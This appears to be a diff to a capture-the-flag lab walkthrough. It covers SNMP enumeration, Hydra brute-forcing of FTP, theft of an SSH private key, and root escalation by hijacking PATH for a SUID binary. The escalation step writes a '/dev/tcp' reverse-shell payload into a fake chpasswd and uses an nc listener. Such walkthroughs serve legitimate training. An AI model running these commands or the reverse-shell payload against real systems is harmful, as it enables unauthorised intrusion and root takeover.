@@ -44,6 +44,7 @@ snmpbulkwalk -c public -v2c 192.168.165.149 .
 # Username query failed
 # Focused Query
 snmpbulkwalk -c public -v2c 192.168.165.149 . | grep NET-SNMP-EXTEND-MIB
+
 # Results
 NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
 NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
@@ -60,10 +61,106 @@ NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
 NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
 NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
 
-# Username john found
+# Username john and kiero found
 ```
 
-## Attempt to Login to FTP with John:John since Hydra Failed
+## Attempt to Login to FTP with Kiero:Kiero since Hydra Failed
 ```bash
-hydra -l john -P /usr/share/wordlists/rockyou.txt ftp://192.168.165.149 -t 4
+hydra -L users.txt -P users.txt ftp://192.168.165.149
+
+# Results
+[21][ftp] host: 192.168.165.149   login: kiero   password: kiero
 ```
+
+## FTP Login as Kiero
+
+```bash
+ftp kiero@192.168.165.149
+
+# Dir enum
+dir
+
+# Results
+-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
+-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
+-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
+
+# Download
+
+get id_rsa
+
+# Change permissions
+sudo chmod 600 id_rsa
+
+# Log in
+# Login as Kiero failed. Attempt john
+ssh -i id_rsa john@192.168.165.149
+
+# Success
+# Grab Flag
+```
+
+## Found interesting Binary
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+
+# Results
+/home/john/RESET_PASSWD
+
+# Check Ownership
+ls -la /home/john/RESET_PASSWD
+
+# Results (RAN BY ROOT)
+-rwsrwsr-x 1 root root 16792 Nov 21  2022 /home/john/RESET_PASSWD
+```
+![alt text](image.png)
+
+## Run strings on it to see what commands it calls internally
+```bash
+strings /home/john/RESET_PASSWD
+
+#NOTE: We're looking to see if it calls any commands without a full absolute path
+# We see this:
+echo kiero:kiero | chpasswd
+
+# NOTE: it's calling chpasswd without the full path /usr/sbin/chpasswd. That means when it runs, it searches your PATH variable to find chpasswd. If we put a malicious chpasswd in /tmp and add /tmp to the front of PATH, it'll execute ours instead with root privileges.
+```
+
+## Change PATH Variable
+```bash
+export PATH=/tmp:$PATH
+
+# This makes it so the /tmp path is searched first
+```
+
+## Start Lisnter and establish shell
+
+```bash
+# Listener
+nc -lvnp 4444
+
+# Revshells to create shell (Change to linux and other applicable options)
+/bin/sh -i >& /dev/tcp/192.168.45.244/4444 0>&1
+
+# change directory
+cd /tmp
+
+# Create shell file
+nano chpasswd
+
+#Paste shell contents 
+#!/bin/bash
+/bin/sh -i >& /dev/tcp/192.168.45.244/4444 0>&1
+
+# Change permissions
+chmod +x /tmp/chpasswd
+
+# Run file
+./RESET_PASSWD
+
+# Shell established as root
+# Grab root flag
+```
+![alt text](image-1.png)
+![alt text](image-2.png)
